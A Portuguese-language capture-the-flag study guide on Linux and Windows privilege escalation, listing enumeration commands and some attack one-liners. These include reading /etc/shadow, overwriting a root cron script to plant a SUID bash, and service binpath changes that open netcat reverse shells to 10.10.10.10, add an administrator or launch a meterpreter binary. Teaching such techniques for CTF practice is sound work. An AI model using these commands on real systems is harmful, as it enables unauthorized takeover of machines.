
# PRIVILEGE ESCALATION
# Descrição

Escalada de privilégios é uma técnica de ataque que visa obter permissões mais altas do que aquelas originalmente concedidas a um usuário. Em outras palavras, é o processo de explorar vulnerabilidades ou falhas no sistema para obter controle sobre recursos restritos, em geral, acesso root.

# Principais casos de uso em CTF

Em CTF’s, quase sempre este tópico é abordado, principalmente após explorar uma vulnerabilidade e conseguir acesso remoto à máquina. O acesso simples não é desejado, sempre é preciso escalar e obter acesso total root.

Usualmente, o processo de exploração será diferente em sistemas operacionais diferentes. Para isso separamos em Linux e Windows.

# Observações principais

Dentro da máquina, sempre esteja atento a tudo! Verifique todos os logs, o histórico, aplicações particulares, arquivos e principalmente processos e suas permissões. Não existe um passo a passo aqui, mas há lugares comuns que podem e devem ser verificados.

Geralmente serviços/aplicações podem ter acesso root e você pode ter acesso a eles.

Agilize a busca por CVE’s com o comando:

	   searchsploit 'Parâmetro'

  

# Estratégias Linux

## **Sistema Operacional**

Identifique a versão do sistema operacional e procure por CVE’s:

	cat /etc/os-release 2\>/dev/null

## **Acesso ao PATH**

Verifique as pastas que você tem acesso, se houver algo de interessante você pode conseguir sequestrar o acesso de uma biblioteca/aplicação (Hijacking)

	echo $PATH

## **Senhas de Usuarios**

Verifique se você tem acesso ao arquivo de senhas dos usuários, em caso positivo, quebrar a criptografia pode ser uma opção.

	cat /etc/shadow

## **Variáveis de ambiente**

Observe as variáveis de ambiente em busca de usuários, senhas e chaves de aplicações

	(env set) 2\>/dev/null

## **Kernel**

Verifique se existem CVE’s para o kernel.

	cat /proc/version  
	uname -a

## **Sudo**

O sudo também é vítima de CVE’s dependendo da sua versão, não deixe de verificar 

	sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"

## **Grupos**

Cheque as permissões que você tem através do seu grupo de usuários

	find / -group adm 2>/dev/null

## **Processos**

Verifique os processos e as suas permissões

	ps aux
	ps -ef
	top -n 1

## **Tarefas Programadas**

Alguns aplicativos são configurados para serem executados em dias e horários específicos mesmo com a máquina em suspensão ou com o usuário deslogado, para isso, as credenciais são armazenadas.

	crontab -l
	ls -al /etc/cron* /etc/at*
	cat /etc/cron* /etc/at* /etc/anacrontab
	/var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"

  Se você pode modificar uma tarefa com acesso root você pode obter um shell através de:
  
	echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
	#Wait until it is executed
	/tmp/bash -p

## **Serviços**

Cheque se você tem acesso de escrita a qualquer arquivo .service, em caso positivo você pode modificá-lo para ele iniciar um backdoor ao adicionar ‘ExecStart=/tmp/script.sh’
  
## **Logs**

Olhe os logs e os comportamentos das aplicações, possíveis erros e falhas. Aqui estão informações sobre o porquê o servidor foi criado, observe com cuidado.

	# All logs
	journalctl

	# Current boot
	journalctl -b

	# Kernel messages from boot
	journalctl -k

	# Recent logs
	# -e: Jump to the end in the pager
	# -x: Details
	journalctl -e
	journalctl -ex

	# Shog logs from specified unit
	journalctl -u httpd
	journalctl -u sshd

## **Automações**

Como você pode perceber, o campo para escalar um privilégio é extremamente amplo e exaustivo, para isso, existem ferramentas que varrem o sistema operacional e reúnem informações relevantes.  

Elas estão sendo apresentadas nesse momento do documento para que você entenda como o processo funciona e com isso tenha uma intuição sobre o quê está procurando, além de entender a resposta das ferramentas.  

### LinPEAS

  

Essa ferramenta executa muitas verificações e classifica as informações encontradas em ranks de gravidade, além de senhas e informações dentro de arquivos. Não deixe de verificar cada linha da sua saída! [Baixe aqui!](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

  

# Estratégias Windows

  

As técnicas de escalada de privilégio em windows são idênticas aos Linux, com alguns serviços e funcionalidades a mais para se verificar, ainda assim, é muito extenso.

  

## **Usuários e Grupos**

Observe usuários, grupos e suas permissões na máquina:

	# CMD
	net users %username% #Me
	net users #All local users
	net localgroup #Groups
	net localgroup Administrators #Who is inside Administrators group
	whoami /all #Check the privileges
	
	# PS
	Get-WmiObject -Class Win32_UserAccount
	Get-LocalUser | ft Name,Enabled,LastLogon
	Get-ChildItem C:\Users -Force | select Name
	Get-LocalGroupMember Administrators | ft Name, PrincipalSource

## **Usuários Logados**

Pode acontecer de o usuário já estar logado e você não precisar escalar. Em caso positivo, parabéns você ganhou na Mega-Sena

	qwinsta
	klist sessions

## **Serviços**

Verifique os serviços:

	net start  
	wmic service list brief  
	sc query  
	Get-Service

Verifique suas permissões:

	sc qc <service_name>  
	accesschk.exe -ucqv <Service_Name>

No cenário em que o grupo "Usuários autenticados" possui SERVICE_ALL_ACCESS em um serviço, a modificação do binário executável do serviço é possível. Para modificar e executar sc:

	sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"  
	sc config <Service_Name> binpath= "net localgroup administrators username /add"  
	sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"  
	sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"

## **Automações**

### winPEAS

Assim como no linux, esta é uma ferramenta para automatizar sua busca por informações relevantes sobre o sistema operacional, observe bem as saídas e você deve encontrar o que deve fazer para tomar a máquina para si. [Baixe aqui!](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

# Mais informações

[Neste site](https://book.hacktricks.xyz/) você pode obter mais dicas, informações e procedimentos para escalar privilégios.
